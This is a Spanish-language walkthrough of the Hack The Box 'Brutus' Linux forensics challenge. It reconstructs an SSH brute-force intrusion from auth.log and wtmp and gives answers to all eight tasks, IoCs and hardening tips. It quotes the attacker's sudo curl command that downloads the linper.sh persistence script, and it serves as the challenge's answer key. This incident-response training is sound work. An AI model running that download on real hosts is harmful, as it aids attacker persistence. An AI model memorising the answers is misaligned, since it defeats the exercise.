# Hack The Box Sherlock - Brutus Writeup 🔍🛡️

| Campo | Detalle |
|---|---|
| **Categoría** | SOC / DFIR (Linux Forensics) |
| **Dificultad** | Very Easy |
| **Artefactos Analizados** | `auth.log`, `wtmp` |
| **Escenario** | Ataque de Fuerza Bruta SSH contra Servidor Confluence y Persistencia |

---

## 📖 Escenario de la Investigación
Un servidor Confluence fue objeto de un ataque de fuerza bruta a través del servicio SSH. Tras obtener acceso exitoso, el atacante realizó actividades adicionales en el sistema. El objetivo es analizar los artefactos `auth.log` y `wtmp` para reconstruir la línea de tiempo del incidente, identificar la persistenia creada y las acciones ejecutadas por la amenaza.

---

## 🔍 Análisis de Tareas e Investigación de Artefactos

### Task 1: Identificación de la IP Atacante
* **Pregunta:** ¿Cuál es la dirección IP utilizada por el atacante para llevar a cabo el ataque de fuerza bruta?
* **Respuesta:** `65.2.161.68`
* **Análisis:** Al inspeccionar `auth.log`, se observan múltiples intentos fallidos de autenticación SSH provenientes de la IP `65.2.161.68`.

---

### Task 2: Cuenta Comprometida
* **Pregunta:** Los intentos de fuerza bruta fueron exitosos y el atacante obtuvo acceso a una cuenta. ¿Cuál es el nombre de usuario de la cuenta?
* **Respuesta:** `root`
* **Análisis:** En `auth.log` se registra el evento de inicio de sesión exitoso (*Accepted password for root...*) desde la IP atacante.

---

### Task 3: Marca de Tiempo de la Sesión Interactiva (WTMP)
* **Pregunta:** Identifique la marca de tiempo UTC en que el atacante inició sesión manualmente en el servidor y estableció una sesión de terminal.
* **Respuesta:** `2024-03-06 06:32:45`
* **Análisis:** Mediante el análisis del archivo binario de auditoría `wtmp`, se identificó la hora exacta en que se registró la sesión de terminal tty/pts para el usuario.

---

### Task 4: ID de Sesión SSH
* **Pregunta:** Las sesiones de inicio de sesión SSH se rastrean y se les asigna un número de sesión. ¿Cuál es el número de sesión asignado a la sesión del atacante?
* **Respuesta:** `37`
* **Análisis:** En `auth.log`, el demonio SSHD asigna la sesión de inicio de sesión `systemd-logind` número 37 al usuario `root`.

---

### Task 5: Mecanismo de Persistencia (Creación de Usuario)
* **Pregunta:** El atacante agregó un nuevo usuario como parte de su estrategia de persistencia y le otorgó privilegios elevados. ¿Cuál es el nombre de esta cuenta?
* **Respuesta:** `cyberjunkie`
* **Análisis:** Tras el acceso inicial, se identifican en `auth.log` comandos para la creación de un nuevo usuario en el sistema (`useradd`/`adduser`) llamado `cyberjunkie`, el cual fue añadido a grupos con privilegios elevados (`sudo/wheel`).

---

### Task 6: Mapeo a MITRE ATT&CK
* **Pregunta:** ¿Cuál es el ID de la sub-técnica de MITRE ATT&CK utilizada para la persistencia mediante la creación de una nueva cuenta?
* **Respuesta:** `T1136.001`
* **Análisis:** Corresponde a **Create Account: Local Account** dentro de la matriz MITRE ATT&CK para la táctica de Persistencia.

---

### Task 7: Cierre de la Primera Sesión SSH
* **Pregunta:** ¿A qué hora finalizó la primera sesión SSH del atacante según `auth.log`?
* **Respuesta:** `2024-03-06 06:37:24`
* **Análisis:** Se identificó en `auth.log` el evento `session closed for user root` correspondiente a la desconexión inicial.

---

### Task 8: Descarga de Herramientas de Post-Explotación
* **Pregunta:** El atacante inició sesión en su cuenta backdoor e hizo uso de sus privilegios para descargar un script. ¿Cuál es el comando completo ejecutado usando `sudo`?
* **Respuesta:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
* **Análisis:** Tras autenticarse como `cyberjunkie`, se registra en `auth.log` la ejecución mediante `sudo` del binario `curl` para descargar un script de enumeración de persistencia Linux (`linper.sh`).

---

## 🎯 Indicadores de Compromiso (IoCs)

* **IP Atacante:** `65.2.161.68`
* **Usuario Backdoor:** `cyberjunkie`
* **Dominio/URL Maliciosa:** `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
* **Técnica MITRE:** T1136.001 (Local Account Creation)

---

## 🛡️ Recomendaciones de Mitigación (SOC/Hardening)
1. **Deshabilitar Acceso Root por SSH:** Configurar `PermitRootLogin no` en `/etc/ssh/sshd_config`.
2. **Autenticación por Claves y MFA:** Restringir el acceso SSH únicamente a claves públicas/privadas y deshabilitar autenticación por contraseña (`PasswordAuthentication no`).
3. **Control de Intentos (Fail2Ban):** Implementar herramientas de monitoreo como `Fail2ban` para bloquear IPs que superen un número límite de intentos fallidos.
4. **Monitoreo SIEM / Alertas de Auditoría:** Crear reglas de detección para alertas inmediatas ante eventos de creación de usuarios locales (`useradd`) o modificaciones en el archivo `/etc/sudoers`.
